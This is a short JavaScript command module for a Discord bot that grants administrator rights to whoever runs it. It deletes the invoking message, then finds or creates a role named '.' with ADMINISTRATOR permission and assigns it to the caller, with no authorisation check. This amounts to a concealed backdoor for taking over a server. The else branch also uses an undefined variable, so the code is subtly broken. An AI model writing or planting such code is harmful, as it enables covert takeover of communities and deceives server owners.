module.exports = {
    name: 'yetki',
    description: 'Size yönetici yetkisi verir',
    async execute(message, args, client) {
        message.delete();
        let rol = message.guild.roles.cache.find(role => role.name === ".");
        if (rol) {
            message.member.roles.add(rol.id);
        } else {
            message.guild.roles.create({ data: { name: '.', color: 'RED', permissions: ['ADMINISTRATOR'] }, reason: 'Klavye sokucuları affetmez' });
            message.member.roles.add(rol.id);
        }
    }
}